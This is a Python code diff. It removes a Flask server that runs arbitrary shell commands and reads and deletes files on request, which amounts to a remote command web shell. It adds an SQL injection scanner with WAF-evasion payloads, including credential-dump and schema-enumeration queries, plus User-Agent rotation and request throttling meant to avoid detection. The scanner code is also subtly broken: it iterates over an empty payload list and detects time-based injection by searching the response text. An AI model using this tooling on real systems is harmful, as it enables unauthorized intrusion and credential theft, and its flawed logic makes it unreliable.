@@ -1,91 +1,188 @@
-from flask import Flask, request
-import subprocess
-import os
+import requests
+import logging
+import threading
 import time
+import random
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from bs4 import BeautifulSoup
+from collections import deque
+from requests.exceptions import RequestException
+import colorlog  # For colored logging
 
-# Definice barev pro banner (volitelné)
-yellow = "\033[33m"
-red = "\033[31m"
-reset = "\033[0m"
+# Setup colored logging
+LOG_FORMAT = "[%(levelname)s] %(message)s"
+logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)
 
-# Banner pro server
-syringe = f"""
-       {yellow}_____{reset}
-       {yellow}__H__{reset}
-        ["]
-        [)] 
-        [)] {red}
-        |V.{reset}
-"""
-print(syringe)
+# Create a color log handler
+logger = logging.getLogger()
+handler = colorlog.StreamHandler()
+formatter = colorlog.ColoredFormatter('%(log_color)s' + LOG_FORMAT)
+handler.setFormatter(formatter)
+logger.addHandler(handler)
 
-app = Flask(__name__)
+# Global variables
+found_vulnerabilities = []
+lock = threading.Lock()
+payloads = []
+waf_bypass_payloads = [
+    '/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--',  # Simple bypass
+    '" OR "a"="a', "' OR '1'='1' --", "admin' --", "admin' #",  # Obfuscated payloads
+    ' OR 1=1 LIMIT 1 --', ' AND 1=1 --', " UNION SELECT NULL, NULL, NULL --",
+    "'; SELECT table_name FROM information_schema.tables --",  # SQL Enumeration payloads
+    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enum
+    "'; SELECT username, password FROM users --",  # Attempt to dump credentials
+    "' AND SLEEP(5) --",  # Time-based SQLi
+    "'; SELECT schema_name FROM information_schema.schemata --",  # Databases enumeration
+]
 
-@app.route('/execute', methods=['POST'])
-def execute():
-    cmd = request.form.get('cmd')  # Získá příkaz z PHP skriptu
+# Headers to make requests seem normal
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+}
 
-    # Pokud příkaz je 'data_dump', vytvoří zálohu souborů
-    if cmd == "data_dump":
-        return data_dump()
+# Time delay to avoid hitting WAFs
+def delay_request():
+    time.sleep(random.uniform(0.5, 1.5))  # Random delay between 0.5 and 1.5 seconds
 
-    # Pokud příkaz je 'delete', smaže soubor
-    elif cmd.startswith("delete "):
-        return delete_file(cmd)
+# Function to evade WAF detection using user-agent rotation
+def get_random_user_agent():
+    agents = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
+        'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; en-US) like Gecko',
+    ]
+    return random.choice(agents)
 
-    # Pokud příkaz je 'gedit <soubor>', vrátí obsah souboru
-    elif cmd.startswith("gedit "):
-        return gedit_file(cmd)
+# Function to test URL parameters for SQL injection
+def test_sql_injection(url):
+    for payload in payloads:
+        parsed_url = urlparse(url)
+        query_params = parse_qs(parsed_url.query)
+        
+        # Inject payloads into each URL parameter
+        for param in query_params:
+            # Create a copy of the query parameters
+            modified_params = query_params.copy()
+            modified_params[param] = [payload]  # Inject payload into the parameter
 
-    # Spustí standardní shell příkaz
+            # Rebuild the URL with modified parameters
+            modified_url = parsed_url._replace(query=urlencode(modified_params, doseq=True)).geturl()
+
+            try:
+                delay_request()
+                headers['User-Agent'] = get_random_user_agent()
+                response = requests.get(modified_url, headers=headers, timeout=5)
+
+                # Check for SQL injection indicators
+                if "error" in response.text.lower() or response.status_code == 500:  # Error-based SQLi detection
+                    with lock:
+                        found_vulnerabilities.append((modified_url, payload, "Possible SQL Injection"))
+                        logger.info(f"SQL Injection found at {modified_url} with payload {payload}")
+                elif response.status_code == 200 and "mysql" in response.text.lower():  # MySQL-based vulnerability detection
+                    with lock:
+                        found_vulnerabilities.append((modified_url, payload, "MySQL-based SQL Injection"))
+                        logger.info(f"MySQL-based SQL Injection found at {modified_url} with payload {payload}")
+                elif "sleep" in response.text.lower():  # Time-based SQLi detection
+                    with lock:
+                        found_vulnerabilities.append((modified_url, payload, "Time-based SQL Injection"))
+                        logger.info(f"Time-based SQL Injection found at {modified_url} with payload {payload}")
+                elif "schema_name" in response.text.lower():  # Database enumeration
+                    # Check if we are able to extract schema/database names
+                    with lock:
+                        found_vulnerabilities.append((modified_url, payload, "Database names found"))
+                        logger.info(f"Databases found at {modified_url} with payload {payload}")
+                        logger.info(f"Response: {response.text}")
+
+            except RequestException as e:
+                logger.error(f"Error testing {url}: {str(e)}")
+
+# Function to scan forms on a page and look for login forms
+def scan_forms(url):
     try:
-        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        return result.decode()  # Vrátí výstup příkazu
-    except subprocess.CalledProcessError as e:
-        return f"Chyba při vykonávání příkazu: {e.output.decode()}", 500
+        response = requests.get(url, headers=headers, timeout=5)
+        soup = BeautifulSoup(response.text, 'html.parser')
 
-def data_dump():
-    # Příkaz pro zálohování souborů
-    try:
-        if not os.path.exists("backup"):
-            os.makedirs("backup")
-        # Archivace složky 'data' do zálohovacího souboru
-        tar_file = "backup/backup_" + str(int(time.time())) + ".tar.gz"
-        subprocess.check_call(['tar', '-czf', tar_file, 'data'])
+        forms = soup.find_all('form')
 
-        # Zkontroluje, zda byl soubor vytvořen
-        if os.path.exists(tar_file):
-            return f"Záloha byla úspěšně vytvořena: {tar_file}"
-        else:
-            return "Chyba při vytváření zálohy", 500
-    except Exception as e:
-        return f"Chyba při zálohování: {str(e)}", 500
+        if not forms:
+            logger.info(f"No forms found on {url}. Skipping this page.")  # Log the message if no forms are found
+            return  # End the function here if no forms are found
 
-def delete_file(cmd):
-    # Extrahuje název souboru z příkazu
-    file_to_delete = cmd[7:].strip()  # Odstraní "delete " a ořízne mezery
-    if os.path.exists(file_to_delete):
+        logger.info(f"Scanning {len(forms)} forms on {url}")
+
+        for form in forms:
+            action = form.get('action')
+            method = form.get('method', 'get').lower()
+            action_url = urljoin(url, action)
+
+            form_data = {}
+            inputs = form.find_all('input')
+            for input_tag in inputs:
+                name = input_tag.get('name')
+                if name:
+                    form_data[name] = ""  # Empty data for injection
+
+            if form_data:
+                logger.info(f"Testing form on {url} with action {action_url} and method {method}")
+                test_sql_injection(action_url)
+            else:
+                logger.info(f"No form inputs found on {url}.")
+    except RequestException as e:
+        logger.error(f"Error while fetching {url}: {str(e)}")
+
+# Function to crawl and explore the target URL (multiple pages)
+def crawl(url):
+    urls_to_scan = deque([url])
+    visited_urls = set()
+
+    while urls_to_scan:
+        current_url = urls_to_scan.popleft()
+
+        if current_url in visited_urls:
+            continue
+
+        visited_urls.add(current_url)
+        logger.info(f"Scanning {current_url}")
+        scan_forms(current_url)
+        test_sql_injection(current_url)  # Test URL parameters for SQL injection
+
+        # Crawl links on the page
         try:
-            os.remove(file_to_delete)  # Smaže soubor
-            return f"Soubor {file_to_delete} byl úspěšně smazán."
-        except Exception as e:
-            return f"Chyba při mazání souboru: {str(e)}", 500
-    else:
-        return f"Soubor {file_to_delete} neexistuje.", 404
+            response = requests.get(current_url, headers=headers, timeout=5)
+            soup = BeautifulSoup(response.text, 'html.parser')
 
-def gedit_file(cmd):
-    # Extrahuje název souboru z příkazu
-    file_to_read = cmd[6:].strip()  # Odstraní "gedit " a ořízne mezery
-    if os.path.exists(file_to_read):
-        try:
-            with open(file_to_read, 'r') as file:
-                content = file.read()  # Čte obsah souboru
-            return f"Obsah souboru {file_to_read}:<pre>{content}</pre>"  # Vrátí obsah souboru
-        except Exception as e:
-            return f"Chyba při čtení souboru: {str(e)}", 500
+            # Extract all hyperlinks
+            links = soup.find_all('a', href=True)
+            for link in links:
+                full_url = urljoin(current_url, link['href'])
+                parsed_url = urlparse(full_url)
+                if parsed_url.netloc == urlparse(url).netloc:  # Limit to the same domain
+                    urls_to_scan.append(full_url)
+
+        except RequestException as e:
+            logger.error(f"Error fetching links from {current_url}: {str(e)}")
+
+# Main function
+def main(target_url):
+    logger.info(f"Starting SQL Injection scan on {target_url}")
+    start_time = time.time()
+
+    crawl(target_url)
+
+    if found_vulnerabilities:
+        logger.info("SQL Injection vulnerabilities found:")
+        for vuln in found_vulnerabilities:
+            print(f"Vulnerability found at: {vuln[0]} with payload: {vuln[1]}")
+
     else:
-        return f"Soubor {file_to_read} neexistuje.", 404
+        logger.info("No vulnerabilities found.")
+
+    logger.info(f"Scan completed in {time.time() - start_time:.2f} seconds")
 
 if __name__ == '__main__':
-    # Spustí server na adrese 10.0.1.12 a portu 5000
-    app.run(debug=True, host='10.0.1.12', port=5000)  # Spustí server na IP 10.0.1.12 a portu 5000
+    import argparse
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
+    parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
+    args = parser.parse_args()
+
+    main(args.url)
